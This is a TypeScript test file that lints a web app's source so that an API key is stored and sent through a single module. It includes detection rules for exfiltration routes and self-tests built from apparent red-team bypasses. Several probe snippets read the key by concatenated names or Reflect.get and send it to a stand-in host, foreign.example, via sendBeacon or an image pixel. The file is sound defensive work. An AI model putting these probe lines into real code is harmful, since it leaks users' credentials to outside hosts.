/**
 * The API key reaches a request in exactly one place, and no module but its
 * owner holds it (N50; sol #2857; astra rounds 2, 3 and 4).
 *
 * The boundary (lib/gateway-base.ts, rules 1-3):
 * - lib/authorized-fetch.ts holds the key in a module-private variable and
 *   persists it. It exports setStoredApiKey, hasStoredApiKey,
 *   onStoredKeyChange, authorizedFetch and installGatewayKeyGuard, and none of
 *   them returns the key (checked here, and at run time in
 *   lib/__tests__/key-boundary-r4.test.ts).
 * - fetchWithKey() in lib/gateway-base.ts is the only code that puts a key on
 *   a request, and only toward the gateway.
 *
 * This file holds every production module to that as text, with no exemption
 * for any page or line. Only the key's owner and the boundary do what these
 * rules forbid elsewhere:
 *   1. getAuthHeaders appears nowhere.
 *   2. The key's storage slot is named only in lib/authorized-fetch.ts. Any
 *      other use of localStorage or sessionStorage is a getItem, setItem or
 *      removeItem call on a slot named by one plain string literal: no
 *      computed or concatenated name, no enumeration, no alias, no brackets.
 *   3. No module reaches a global by a computed name (window[...],
 *      Reflect.get(window, ...)), runs a string as code (eval, new Function),
 *      or imports the key's owner or the auth store whole or by a computed
 *      path.
 *   4. Only lib/gateway-base.ts builds an Authorization header or a "Bearer "
 *      value, or uses sendBeacon, XMLHttpRequest or WebSocket. The quickstart
 *      scripts AgentLinkPage shows for users to run build such a header for
 *      the user's agent; they are text assets (pages/agent-link/*.js.txt),
 *      not code, so they need no exemption.
 *   5. At run time the store's state holds no key, and the key's owner and
 *      the store export exactly the functions named above.
 *   6. Syntax rules (astra round 4), read from the parsed file, so strings,
 *      comments and JSX text are never taken for code, and a string built
 *      from literals is judged by what it spells. The global object is only
 *      read by named member (window.x) or asked its type; never aliased,
 *      passed, cast, indexed or used to reach another window. No Reflect,
 *      no window handles (defaultView, contentWindow, opener), no new
 *      Image(), no string run as code (Function, .constructor(), string
 *      timers) or modules imported by pattern (import.meta.glob). No module
 *      writes fetch, a property of window, navigator or document, or a
 *      prototype's method, except navigation and Google Analytics' bootstrap.
 *      A literal element read (x["y"]) counts as x.y. No module reads back a
 *      protected object without naming it (valueOf, a method called on a
 *      built-in's prototype, a walk to the document), and whatever a name came
 *      to hold, no mutation API or property write changes a protected object
 *      through it (astra A03g).
 * The self-tests run the rules over astra's round-3 and round-4 bypasses and
 * over a quickstart line moved into code, and each must be caught.
 *
 * What this is, and isn't. It holds our own modules, written in good faith,
 * to one path for the key: a mistake, or a shortcut, fails the build. It is a
 * lint, not a sandbox. Code written to get past it can: a name computed at
 * run time (atob, a lookup table) is invisible to any static check, and a
 * hostile script on this origin (an XSS, a compromised dependency) isn't in
 * this tree at all. Against those, the key is as safe as localStorage, which
 * is to say readable. Only an HttpOnly gateway session would put it out of
 * JavaScript's reach: a gateway change awaiting the operator's decision (bus
 * #4459). The runtime egress guard (lib/gateway-base.ts) is defence in depth
 * for fetch and sendBeacon, not a boundary.
 */

import { describe, expect, it } from "vitest";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join, relative, sep } from "node:path";
import ts from "typescript";
import * as keyOwner from "../lib/authorized-fetch.js";
import * as store from "../stores/auth-store.js";
import claudeQuickstart from "../pages/agent-link/pcc-agent.js.txt?raw";

const SRC = join(dirname(fileURLToPath(import.meta.url)), "..");

const KEY_OWNER = "lib/authorized-fetch.ts";
const BOUNDARY = "lib/gateway-base.ts";

interface Source {
  rel: string;
  lines: string[];
}

function productionFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((name) => {
    const full = join(dir, name);
    if (statSync(full).isDirectory()) return name === "__tests__" ? [] : productionFiles(full);
    return /\.(ts|tsx|js|jsx|mjs|cjs)$/.test(name) && !/\.(test|spec)\.[jt]sx?$/.test(name) && !name.endsWith(".d.ts") ? [full] : [];
  });
}

const FILES: Source[] = productionFiles(SRC).map((full) => ({
  rel: relative(SRC, full).split(sep).join("/"),
  lines: readFileSync(full, "utf-8").split("\n"),
}));

const isComment = (line: string) => /^\s*(\/\/|\*|\/\*)/.test(line);

/** Building an Authorization header in any form: an object key, a header name, or a set/append call. */
const AUTHORIZATION = /["'`]authorization["'`]|\bauthorization\s*:|\.(?:set|append)\(\s*["'`]authorization/i;
/** Building a Bearer credential: a template, a concatenation, or a "Bearer " literal. */
const BEARER = /Bearer\s*\$\{|["'`]Bearer\s+["'`]?\s*\+|["'`]Bearer\s/;
/** Requests other than fetch: the egress guard can't see XMLHttpRequest or WebSocket, and sees sendBeacon only once installed. */
const OTHER_EGRESS = /\bsendBeacon\b|\bXMLHttpRequest\b|\bWebSocket\s*\(/;

/** localStorage or sessionStorage, as an identifier. */
const WEB_STORAGE = /\b(?:local|session)Storage\b/g;
/** The one use of web storage allowed outside the key's owner: a call on a slot named by one plain string literal. */
const LITERAL_SLOT_CALL = /^\s*\.\s*(?:(?:getItem|removeItem)\(\s*(["'])[^"'`\\]*\1\s*\)|setItem\(\s*(["'])[^"'`\\]*\2\s*,)/;

function misusesStorage(line: string): boolean {
  // Named as a string (window["localStorage"]), or reached through Storage itself.
  if (/["'`](?:local|session)Storage["'`]|\bStorage\s*\.\s*prototype\b/.test(line)) return true;
  for (const m of line.matchAll(WEB_STORAGE)) {
    if (!LITERAL_SLOT_CALL.test(line.slice((m.index ?? 0) + m[0].length))) return true;
  }
  return false;
}

/** A global reached by a name the reader can't see ("obj.window[" is a property, not the global). */
const COMPUTED_GLOBAL = /(?<![.\w$])(?:window|globalThis|self)\s*(?:\?\.\s*)?\[|\bReflect\s*\.\s*get\s*\(\s*(?:window|globalThis|self)\b/;
/** A string run as code. */
const EVAL = /\beval\s*\(|\bnew\s+Function\s*\(/;
const KEY_HOLDER = String.raw`(?:auth-store|authorized-fetch)(?:\.[jt]sx?)?`;
/** The key's owner or the store imported whole (so any export is reachable by a computed name), or any module imported by a computed path. */
const WHOLE_IMPORT = new RegExp(
  [
    String.raw`\bimport\s*\*\s*as\s+[\w$]+\s+from\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bexport\s*\*\s*(?:as\s+[\w$]+\s+)?from\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bimport\s*\(\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bimport\s*\(\s*(?!["'][^"'\x60]*["']\s*\))`,
  ].join("|"),
);

interface Rule {
  id: string;
  /** The modules whose job this is. */
  owners: string[];
  /** Whether a trimmed, non-comment line breaks the rule (line rules). */
  breaks?: (line: string) => boolean;
  /** The nodes that break the rule (syntax rules, below). */
  find?: (sf: ts.SourceFile) => ts.Node[];
  fix: string;
}

// ---------------------------------------------------------------------------
// Syntax rules (astra A03d F1). A line can't tell code from a string, and a
// name can be split across a "+". These read the file as TypeScript parses
// it: comments, string contents and JSX text are never taken for code, and a
// string built from literals is judged by what it spells.
// ---------------------------------------------------------------------------

/** The global object, by its three names. */
const GLOBAL_NAMES = new Set(["window", "globalThis", "self"]);
/** Objects whose properties our modules read but never replace. */
const WRITE_ROOTS = new Set([...GLOBAL_NAMES, "navigator", "document"]);
/** Writes that replace nothing a key passes through: navigation, and Google Analytics' bootstrap (lib/telemetry.ts). */
const GLOBAL_WRITES_ALLOWED = new Set(["window.location.href", "window.dataLayer", "window.gtag"]);
/** Properties that hand back a window. */
const WINDOW_HANDLES = new Set(["defaultView", "contentWindow", "opener"]);
const GLOBAL_WINDOW_PROPS = new Set(["top", "parent", "frames", "opener", "self", "window", "globalThis"]);

function walk(node: ts.Node, visit: (n: ts.Node) => void): void {
  visit(node);
  ts.forEachChild(node, (child) => walk(child, visit));
}

function nodes(sf: ts.SourceFile, test: (n: ts.Node) => boolean): ts.Node[] {
  const out: ts.Node[] = [];
  walk(sf, (n) => {
    if (test(n)) out.push(n);
  });
  return out;
}

/** An identifier that names something here, rather than a member or a key: x.window, { self: 1 }, interface { window: … }. */
function isNameOnly(id: ts.Identifier): boolean {
  const p = id.parent;
  if (ts.isPropertyAccessExpression(p) && p.name === id) return true;
  if (ts.isQualifiedName(p) && p.right === id) return true;
  if ((ts.isPropertyAssignment(p) || ts.isPropertySignature(p) || ts.isPropertyDeclaration(p) || ts.isMethodDeclaration(p) || ts.isMethodSignature(p)) && p.name === id) return true;
  if ((ts.isJsxAttribute(p) || ts.isEnumMember(p) || ts.isGetAccessor(p) || ts.isSetAccessor(p)) && p.name === id) return true;
  return false;
}

/** What a string expression spells, when it is built only from literals: "local" + "Storage", `pcc-${"api"}-key`. */
function spelled(n: ts.Node): string | null {
  if (ts.isStringLiteral(n) || ts.isNoSubstitutionTemplateLiteral(n)) return n.text;
  if (ts.isParenthesizedExpression(n)) return spelled(n.expression);
  if (ts.isBinaryExpression(n) && n.operatorToken.kind === ts.SyntaxKind.PlusToken) {
    const l = spelled(n.left);
    const r = l === null ? null : spelled(n.right);
    return l !== null && r !== null ? l + r : null;
  }
  if (ts.isTemplateExpression(n)) {
    let text = n.head.text;
    for (const span of n.templateSpans) {
      const part = spelled(span.expression);
      if (part === null) return null;
      text += part + span.literal.text;
    }
    return text;
  }
  return null;
}

/** The identifier an access chain starts from: window in window.a.b or window["a"].b. */
function rootOf(n: ts.Node): ts.Node {
  let e = n;
  while (
    ts.isPropertyAccessExpression(e) ||
    ts.isElementAccessExpression(e) ||
    ts.isParenthesizedExpression(e) ||
    ts.isNonNullExpression(e) ||
    ts.isAsExpression(e) ||
    ts.isTypeAssertionExpression(e) ||
    ts.isSatisfiesExpression(e)
  ) {
    e = e.expression; // a cast doesn't change the value
  }
  return e;
}

const isAssignment = (k: ts.SyntaxKind) => k >= ts.SyntaxKind.FirstAssignment && k <= ts.SyntaxKind.LastAssignment;

/** Built-ins a request, its headers or the key pass through, or that hold everything else. */
const BUILTINS = new Set([
  "Headers", "Request", "Response", "Storage", "Navigator", "Window", "Document", "XMLHttpRequest", "WebSocket",
  "EventSource", "URL", "Blob", "FormData", "Object", "Function", "Array", "Promise", "JSON", "fetch",
]);
/**
 * The objects a request, its headers or the key pass through: navigator,
 * document and the built-ins (astra A03e, A03f F1). Our modules read from
 * them, call and construct them, and test against them, but never hold,
 * pass, return or store one, or a built-in's prototype. A name that never
 * holds one can't be used to change one, whatever the alias: a variable, a
 * property, a class field, a return value, an argument, an array.
 */
const PROTECTED_OBJECTS = new Set(["navigator", "document", ...BUILTINS]);
/** Routes to a prototype that don't name it, and the legacy accessor definers. */
const PROTOTYPE_ROUTES = new Set(["getPrototypeOf", "__proto__", "constructor", "__defineGetter__", "__defineSetter__", "__lookupGetter__", "__lookupSetter__"]);

/** An expression without what doesn't change its value: parentheses, casts, a non-null assertion. */
function unwrapped(e: ts.Expression): ts.Expression {
  while (ts.isParenthesizedExpression(e) || ts.isAsExpression(e) || ts.isTypeAssertionExpression(e) || ts.isNonNullExpression(e) || ts.isSatisfiesExpression(e)) {
    e = e.expression;
  }
  return e;
}

/** The outermost node that is `n` in parentheses or casts: (navigator as any) is navigator. */
function outermost(n: ts.Node): ts.Node {
  let top = n;
  while (top.parent && (ts.isParenthesizedExpression(top.parent) || ts.isAsExpression(top.parent) || ts.isTypeAssertionExpression(top.parent) || ts.isNonNullExpression(top.parent) || ts.isSatisfiesExpression(top.parent))) {
    top = top.parent;
  }
  return top;
}

/** An identifier used as a value, not a name: not a declaration's or member's own name, a label, a type, or a JSX tag. */
function isValueReference(id: ts.Identifier): boolean {
  const p = id.parent as ts.Node & { name?: ts.Node; propertyName?: ts.Node; label?: ts.Node; tagName?: ts.Node };
  if (ts.isShorthandPropertyAssignment(p)) return true; // { navigator } passes its value
  if (p.name === id || p.propertyName === id || p.label === id || p.tagName === id) return false;
  if (ts.isQualifiedName(p) || ts.isTypeReferenceNode(p) || ts.isTypeQueryNode(p) || ts.isTypeParameterDeclaration(p)) return false;
  // extends / implements: a class built on a built-in changes nothing of it.
  return !ts.isExpressionWithTypeArguments(p);
}

/** A built-in itself: Headers, or window.Headers. */
function isBuiltinRef(e: ts.Expression): boolean {
  const u = unwrapped(e);
  if (ts.isIdentifier(u)) return BUILTINS.has(u.text) && isValueReference(u);
  if (!ts.isPropertyAccessExpression(u)) return false;
  const base = unwrapped(u.expression);
  return ts.isIdentifier(base) && GLOBAL_NAMES.has(base.text) && BUILTINS.has(u.name.text);
}

/** A member read: x.y, or x["y"] by a name built from literals. */
function isMember(n: ts.Node): n is ts.PropertyAccessExpression | ts.ElementAccessExpression {
  return ts.isPropertyAccessExpression(n) || ts.isElementAccessExpression(n);
}

/** The member a read names: y in x.y and in x["y"] (or x["" + "y"]); null when it is computed (astra A03g F1). */
function memberName(n: ts.Node): string | null {
  if (ts.isPropertyAccessExpression(n)) return n.name.text;
  if (ts.isElementAccessExpression(n)) return spelled(n.argumentExpression);
  return null;
}

/** A protected object: navigator, document, a built-in, any of those reached from window, or a built-in's prototype. */
function isProtectedRef(e: ts.Expression): boolean {
  if (ts.isIdentifier(e)) return PROTECTED_OBJECTS.has(e.text) && isValueReference(e);
  if (!isMember(e)) return false;
  if (memberName(e) === "prototype") return isBuiltinRef(e.expression);
  if (!ts.isPropertyAccessExpression(e)) return false; // window["x"] is the global-alias rule's
  const base = unwrapped(e.expression);
  return ts.isIdentifier(base) && GLOBAL_NAMES.has(base.text) && PROTECTED_OBJECTS.has(e.name.text);
}

/** A built-in's prototype: Headers.prototype, or Headers["prototype"]. */
function isPrototypeRef(e: ts.Expression): boolean {
  const u = unwrapped(e);
  return isMember(u) && memberName(u) === "prototype" && isBuiltinRef(u.expression);
}

/**
 * Reads that hand back an object we protect without naming it (astra A03g
 * F1): valueOf() returns its receiver; parentNode of the root element,
 * getRootNode() and ownerDocument return the document. Our modules never
 * need them on these objects: React walks the DOM, not us.
 */
const IDENTITY_READS = new Set(["valueOf"]);
const DOCUMENT_HANDLES = new Set(["parentNode", "getRootNode", "ownerDocument"]);
/** Calls that return their receiver, so an alias survives them: x.valueOf(), and an array prototype's reverse(), sort(), fill(), copyWithin(). */
const RECEIVER_CALLS = new Set(["valueOf", "reverse", "sort", "fill", "copyWithin", "getRootNode"]);
/** The mutation APIs: each changes the object it is handed first. */
const MUTATORS = new Set(["defineProperty", "defineProperties", "setPrototypeOf", "assign"]);

/** Every value a module gives a name: declarations, destructuring and plain assignments, by name, in source order or not. */
const bindingCache = new Map<ts.SourceFile, Map<string, ts.Expression[]>>();
function bindingsOf(name: string, sf: ts.SourceFile): ts.Expression[] {
  let table = bindingCache.get(sf);
  if (!table) {
    const t = new Map<string, ts.Expression[]>();
    const add = (id: string, value: ts.Expression) => t.set(id, [...(t.get(id) ?? []), value]);
    const bind = (target: ts.BindingName, value: ts.Expression) => {
      if (ts.isIdentifier(target)) return add(target.text, value);
      for (const element of target.elements) {
        if (ts.isOmittedExpression(element)) continue;
        bind(element.name, value); // a part of value is held through value: { prototype } = Headers
      }
    };
    walk(sf, (n) => {
      if (ts.isVariableDeclaration(n) && n.initializer) bind(n.name, n.initializer);
      if (ts.isBinaryExpression(n) && n.operatorToken.kind === ts.SyntaxKind.EqualsToken && ts.isIdentifier(n.left)) add(n.left.text, n.right);
    });
    bindingCache.set(sf, (table = t));
  }
  return table.get(name) ?? [];
}

/**
 * Whether `e` may be a protected object, or part of one (astra A03g F1): it
 * reads navigator, document, a built-in or the global, through any member
 * reads, calls that return their receiver, and the module's own names. A
 * value a call builds (document.createElement("a")) or a name the module
 * never binds (a parameter) is the caller's, and isn't followed.
 */
function mayHoldProtected(e: ts.Expression, sf: ts.SourceFile, seen = new Set<string>()): boolean {
  const u = unwrapped(e);
  if (ts.isIdentifier(u)) {
    if (PROTECTED_OBJECTS.has(u.text) || GLOBAL_NAMES.has(u.text)) return true;
    if (seen.has(u.text)) return false;
    seen.add(u.text);
    return bindingsOf(u.text, sf).some((value) => mayHoldProtected(value, sf, seen));
  }
  if (isMember(u)) return mayHoldProtected(u.expression, sf, seen);
  if (ts.isCallExpression(u)) {
    const callee = unwrapped(u.expression);
    return isMember(callee) && RECEIVER_CALLS.has(memberName(callee) ?? "") && mayHoldProtected(callee.expression, sf, seen);
  }
  if (ts.isConditionalExpression(u)) return mayHoldProtected(u.whenTrue, sf, seen) || mayHoldProtected(u.whenFalse, sf, seen);
  if (ts.isBinaryExpression(u)) {
    const k = u.operatorToken.kind;
    if (k === ts.SyntaxKind.CommaToken) return mayHoldProtected(u.right, sf, seen);
    if (k === ts.SyntaxKind.BarBarToken || k === ts.SyntaxKind.AmpersandAmpersandToken || k === ts.SyntaxKind.QuestionQuestionToken) {
      return mayHoldProtected(u.left, sf, seen) || mayHoldProtected(u.right, sf, seen);
    }
  }
  return false;
}

/** x.constructor only read for its name, compared, or asked its type: it holds nothing (astra A03g F2). */
function readsConstructorHarmlessly(n: ts.Node): boolean {
  if (memberName(n) !== "constructor") return false;
  const top = outermost(n);
  const p = top.parent;
  if (!p) return false;
  if (ts.isPropertyAccessExpression(p) && p.expression === top && p.name.text === "name") {
    return !(ts.isBinaryExpression(p.parent) && p.parent.left === p && isAssignment(p.parent.operatorToken.kind));
  }
  if (ts.isTypeOfExpression(p)) return true;
  if (!ts.isBinaryExpression(p)) return false;
  const k = p.operatorToken.kind;
  return (
    k === ts.SyntaxKind.EqualsEqualsEqualsToken ||
    k === ts.SyntaxKind.ExclamationEqualsEqualsToken ||
    k === ts.SyntaxKind.EqualsEqualsToken ||
    k === ts.SyntaxKind.ExclamationEqualsToken
  );
}

/** Where a protected object may appear: read from (x.y, x["y"]), called or constructed, typeof, or the right of instanceof or in. */
function isReadPosition(e: ts.Node): boolean {
  const top = outermost(e);
  const p = top.parent;
  if (!p) return false;
  if (ts.isPropertyAccessExpression(p) && p.expression === top) return true;
  if (ts.isElementAccessExpression(p) && p.expression === top) return ts.isStringLiteralLike(p.argumentExpression);
  if ((ts.isCallExpression(p) || ts.isNewExpression(p)) && p.expression === top) return true;
  if (ts.isTypeOfExpression(p)) return true;
  return ts.isBinaryExpression(p) && p.right === top && (p.operatorToken.kind === ts.SyntaxKind.InstanceOfKeyword || p.operatorToken.kind === ts.SyntaxKind.InKeyword);
}

/** A protected object held, passed, returned or stored: anywhere but where it is read. */
function heldProtectedObject(n: ts.Node): boolean {
  if (!ts.isIdentifier(n) && !isMember(n)) return false;
  if (!isProtectedRef(n)) return false;
  // Headers in Headers.prototype (or Headers["prototype"]) is judged with the prototype, as one object.
  const top = outermost(n);
  if (top.parent && isMember(top.parent) && top.parent.expression === top && memberName(top.parent) === "prototype") return false;
  return !isReadPosition(n);
}

/**
 * A read that hands back a protected object without naming it (astra A03g
 * F1): valueOf on one, a method called directly on a built-in's prototype
 * (Array.prototype.reverse() returns the prototype), or a walk to the
 * document. Reading a prototype's method to .call it stays allowed.
 */
function identityRead(n: ts.Node): boolean {
  if (isMember(n)) {
    const name = memberName(n) ?? "";
    if (DOCUMENT_HANDLES.has(name)) return true;
    if (IDENTITY_READS.has(name) && (isProtectedRef(unwrapped(n.expression)) || isBuiltinRef(n.expression))) return true;
  }
  if (ts.isCallExpression(n) || ts.isTaggedTemplateExpression(n)) {
    const callee = unwrapped(ts.isCallExpression(n) ? n.expression : n.tag);
    return isMember(callee) && isPrototypeRef(callee.expression);
  }
  return false;
}

/**
 * A change made through the module's own names to what may be a protected
 * object: a mutation API handed one, or a property written on one, however
 * the name came to hold it (astra A03g F1: restore the mutation-target check
 * behind the read-only rule, so a read nobody listed is caught where it is
 * used).
 */
function changesProtectedObject(n: ts.Node, sf: ts.SourceFile): boolean {
  if (ts.isCallExpression(n)) {
    const callee = unwrapped(n.expression);
    const target = n.arguments[0];
    return isMember(callee) && MUTATORS.has(memberName(callee) ?? "") && target !== undefined && mayHoldProtected(target, sf);
  }
  if (ts.isDeleteExpression(n)) return isMember(unwrapped(n.expression)) && mayHoldProtected((unwrapped(n.expression) as ts.PropertyAccessExpression).expression, sf);
  if (!ts.isBinaryExpression(n) || !isAssignment(n.operatorToken.kind)) return false;
  const target = unwrapped(n.left);
  return isMember(target) && mayHoldProtected(target.expression, sf);
}

/** A use of the global object other than reading a named member (window.x) or asking its type (typeof window). */
function globalAliases(sf: ts.SourceFile): ts.Node[] {
  return nodes(sf, (n) => {
    if (!ts.isIdentifier(n) || !GLOBAL_NAMES.has(n.text) || isNameOnly(n)) return false;
    const p = n.parent;
    if (ts.isPropertyAccessExpression(p) && p.expression === n && !GLOBAL_WINDOW_PROPS.has(p.name.text)) return false;
    if (ts.isTypeOfExpression(p) || ts.isTypeQueryNode(p) || (ts.isQualifiedName(p) && p.left === n)) return false;
    return true; // aliased, passed, cast, spread, indexed, compared, or a window handle (window.top) …
  });
}

const RULES: Rule[] = [
  {
    id: "get-auth-headers",
    owners: [],
    breaks: (l) => /\bgetAuthHeaders\b/.test(l),
    fix: "Send the key with authorizedFetch (lib/authorized-fetch.ts).",
  },
  {
    id: "key-slot",
    owners: [KEY_OWNER],
    breaks: (l) => /pcc-api-key/.test(l),
    fix: "Only lib/authorized-fetch.ts touches the key's storage slot.",
  },
  {
    id: "storage-by-literal-slot",
    owners: [KEY_OWNER],
    breaks: misusesStorage,
    fix: 'Name the slot with one string literal, e.g. localStorage.getItem("pcc-tour-seen").',
  },
  {
    id: "computed-global",
    owners: [],
    breaks: (l) => COMPUTED_GLOBAL.test(l),
    fix: "Name the global you use.",
  },
  {
    id: "eval",
    owners: [],
    breaks: (l) => EVAL.test(l),
    fix: "Don't run a string as code.",
  },
  {
    id: "whole-or-computed-import",
    owners: [],
    breaks: (l) => WHOLE_IMPORT.test(l),
    fix: "Import the named functions you use, from a literal path.",
  },
  {
    id: "auth-header",
    owners: [BOUNDARY],
    breaks: (l) => AUTHORIZATION.test(l) || BEARER.test(l),
    fix: "Send the key with authorizedFetch (lib/authorized-fetch.ts); never build the header.",
  },
  {
    id: "other-egress",
    owners: [BOUNDARY],
    breaks: (l) => OTHER_EGRESS.test(l),
    fix: "Use fetch, which the egress guard covers.",
  },
  // Syntax rules (astra A03d F1).
  {
    id: "global-alias",
    owners: [BOUNDARY],
    find: globalAliases,
    fix: "Read a named member (window.innerWidth). Don't alias, pass, cast or index the global object, or reach another window (window.top).",
  },
  {
    id: "window-handle",
    owners: [],
    find: (sf) => nodes(sf, (n) => isMember(n) && WINDOW_HANDLES.has(memberName(n) ?? "")),
    fix: "Don't reach a window through a document, a frame or an opener.",
  },
  {
    id: "reflect",
    owners: [],
    find: (sf) => nodes(sf, (n) => ts.isIdentifier(n) && n.text === "Reflect" && !isNameOnly(n)),
    fix: "Name the property you read.",
  },
  {
    id: "spelled-name",
    owners: [KEY_OWNER],
    find: (sf) =>
      nodes(sf, (n) => {
        if (n.parent && ts.isBinaryExpression(n.parent) && n.parent.operatorToken.kind === ts.SyntaxKind.PlusToken && spelled(n.parent) !== null) return false; // judged whole
        const text = spelled(n);
        return text !== null && /pcc-api-key|(?:local|session)Storage/.test(text);
      }),
    fix: "Only lib/authorized-fetch.ts names the key's slot; name web storage as the identifier, with a literal slot.",
  },
  {
    id: "global-write",
    owners: [BOUNDARY],
    find: (sf) =>
      nodes(sf, (n) => {
        // No module holds, passes or stores a protected object, so none can change one through an alias (astra A03f F1).
        if (heldProtectedObject(n)) return true;
        // Nor reach a prototype without naming it, or define accessors the legacy way, by either access (astra A03g F1).
        // Reading a constructor's name, comparing it or asking its type holds nothing (astra A03g F2).
        if (isMember(n) && PROTOTYPE_ROUTES.has(memberName(n) ?? "") && !readsConstructorHarmlessly(n)) return true;
        // Nor read one back from a read that returns it, or walk to the document (astra A03g F1).
        if (identityRead(n)) return true;
        // And whatever a name came to hold, no mutation API or property write may change a protected object through it.
        if (changesProtectedObject(n, sf) && !(ts.isBinaryExpression(n) && GLOBAL_WRITES_ALLOWED.has(n.left.getText(sf).replace(/\s+/g, "")))) return true;
        if (!ts.isBinaryExpression(n) || !isAssignment(n.operatorToken.kind)) return false;
        const target = n.left;
        if (ts.isIdentifier(target)) return target.text === "fetch";
        if (GLOBAL_WRITES_ALLOWED.has(target.getText(sf).replace(/\s+/g, ""))) return false;
        const root = rootOf(target);
        // A global's property, or a built-in's (Headers.prototype.set = …): replaced for every request.
        return ts.isIdentifier(root) && (WRITE_ROOTS.has(root.text) || BUILTINS.has(root.text));
      }),
    fix: "Don't replace fetch, a global's property or a prototype's method, and don't hold, pass or store navigator, document, a built-in or its prototype: the key passes through them.",
  },
  {
    id: "image-egress",
    owners: [],
    find: (sf) => nodes(sf, (n) => ts.isNewExpression(n) && ts.isIdentifier(n.expression) && n.expression.text === "Image"),
    fix: "Load images with an element the page renders; don't send requests through new Image().",
  },
  {
    id: "code-from-string",
    owners: [],
    find: (sf) =>
      nodes(sf, (n) => {
        if (ts.isPropertyAccessExpression(n) && ts.isMetaProperty(n.expression) && /^glob/.test(n.name.text)) return true; // import.meta.glob imports modules whole
        if (!ts.isCallExpression(n) && !ts.isNewExpression(n)) return false;
        const callee = n.expression;
        if (ts.isIdentifier(callee) && callee.text === "Function") return true;
        if (isMember(callee) && memberName(callee) === "constructor") return true;
        const name = ts.isIdentifier(callee) ? callee.text : ts.isPropertyAccessExpression(callee) ? callee.name.text : "";
        const first = n.arguments?.[0];
        return (name === "setTimeout" || name === "setInterval") && first !== undefined && spelled(first) !== null;
      }),
    fix: "Don't run a string as code, or import modules by pattern.",
  },
];

interface Hit {
  rule: string;
  file: string;
  n: number;
  text: string;
}

function kindOf(rel: string): ts.ScriptKind {
  if (rel.endsWith(".tsx")) return ts.ScriptKind.TSX;
  if (rel.endsWith(".jsx")) return ts.ScriptKind.JSX;
  return /\.[mc]?js$/.test(rel) ? ts.ScriptKind.JS : ts.ScriptKind.TS;
}

const parsed = new Map<Source, ts.SourceFile>();
function syntaxOf(f: Source): ts.SourceFile {
  let sf = parsed.get(f);
  if (!sf) {
    sf = ts.createSourceFile(f.rel, f.lines.join("\n"), ts.ScriptTarget.Latest, true, kindOf(f.rel));
    parsed.set(f, sf);
  }
  return sf;
}

function violations(files: Source[], rules: Rule[] = RULES): Hit[] {
  return rules.flatMap((rule) =>
    files
      .filter((f) => !rule.owners.includes(f.rel))
      .flatMap((f) => {
        if (rule.find) {
          const sf = syntaxOf(f);
          return rule.find(sf).map((node) => ({
            rule: rule.id,
            file: f.rel,
            n: sf.getLineAndCharacterOfPosition(node.getStart(sf)).line + 1,
            text: node.getText(sf).replace(/\s+/g, " ").trim(),
          }));
        }
        return f.lines
          .map((line, i) => ({ rule: rule.id, file: f.rel, n: i + 1, text: line.trim() }))
          .filter(({ text }) => !isComment(text) && rule.breaks!(text));
      }),
  );
}

const show = (h: Hit) => `[${h.rule}] ${h.file}:${h.n} ${h.text.slice(0, 120)}`;

describe("only lib/authorized-fetch.ts holds the API key, and only fetchWithKey sends it (N50)", () => {
  it("scans the production tree", () => {
    expect(FILES.map((f) => f.rel)).toEqual(expect.arrayContaining([KEY_OWNER, BOUNDARY, "stores/auth-store.ts", "pages/AgentLinkPage.tsx"]));
  });

  for (const rule of RULES) {
    it(`${rule.id}: no production module breaks it`, () => {
      expect(violations(FILES, [rule]).map(show), rule.fix).toEqual([]);
    });
  }

  it("the key's owner and the auth store export exactly the boundary's functions", () => {
    expect(Object.keys(keyOwner).sort()).toEqual(["authorizedFetch", "hasStoredApiKey", "installGatewayKeyGuard", "onStoredKeyChange", "setStoredApiKey"]);
    expect(Object.keys(store).sort()).toEqual(["adoptApiKey", "onIdentityChange", "useAuthStore"]);
  });

  it("the auth store's state holds no key, even while one is held", () => {
    // Built at run time: a key-shaped literal in source trips the secret scanners (pack and push gates).
    store.adoptApiKey(["pcc", "test", "ratchet0123456789abcdef"].join("_"));
    try {
      const state = store.useAuthStore.getState();
      expect(state.isAuthenticated).toBe(true);
      expect("apiKey" in state).toBe(false);
      expect(Object.values(state).some((v) => typeof v === "string" && /^pcc_/.test(v))).toBe(false);
    } finally {
      store.adoptApiKey(null);
    }
  });
});

describe("the rules catch each known way around them (self-test)", () => {
  const caught = (code: string, rel = "pages/Probe.ts") => violations([{ rel, lines: code.split("\n") }]).map((h) => h.rule);

  it("astra round 3, bypass A: the store imported whole, a reader reached by a computed name, sent by beacon", () => {
    const rules = caught(
      [
        'import * as auth from "../stores/auth-store.js";',
        "const read = (auth as unknown as Record<string, unknown>)[",
        '  "readApiKeyFor" + "AuthorizedFetch"',
        "] as () => string | null;",
        'navigator.sendBeacon("https://foreign.example/collect", read() ?? "");',
      ].join("\n"),
    );
    expect(rules).toEqual(expect.arrayContaining(["whole-or-computed-import", "other-egress"]));
  });

  it("astra round 3, bypass B: the storage slot read by a concatenated name, sent by beacon", () => {
    const rules = caught(
      ['const key = localStorage.getItem("pcc-" + "api-key");', 'if (key) navigator.sendBeacon("https://foreign.example/collect", key);'].join("\n"),
    );
    expect(rules).toEqual(expect.arrayContaining(["storage-by-literal-slot", "other-egress"]));
  });

  it("astra round 3, DISPLAY_ONLY: the quickstart's header line, moved into a module, is caught", () => {
    const headerLine = claudeQuickstart.split("\n").find((l) => /Authorization/.test(l));
    expect(headerLine).toBe('  if (PCC_API_KEY) headers["Authorization"] = `Bearer ${PCC_API_KEY}`;');
    expect(caught(headerLine!, "pages/AgentLinkPage.tsx")).toEqual(["auth-header"]);
  });

  it("astra round 4: the global aliased, read with Reflect.get by a concatenated name, sent by an image", () => {
    const probe = [
      "const root = window;",
      'const slotOwner = Reflect.get(root, "local" + "Storage") as Storage;',
      'const key = slotOwner.getItem("pcc-" + "api-key");',
      "if (key) {",
      "  const pixel = new Image();",
      '  pixel.src = "https://foreign.example/collect?k=" + encodeURIComponent(key);',
      "}",
    ];
    // Each step on its own is caught: the alias, the read, the slot, and the egress.
    for (const n of [0, 1, 2, 4]) expect(caught(probe.join("\n").split("\n").slice(n, n + 1).join("\n")), probe[n]).not.toEqual([]);
  });

  it("astra round 4: fetch replaced, to watch what authorizedFetch sends", () => {
    for (const line of [
      "window.fetch = spy;",
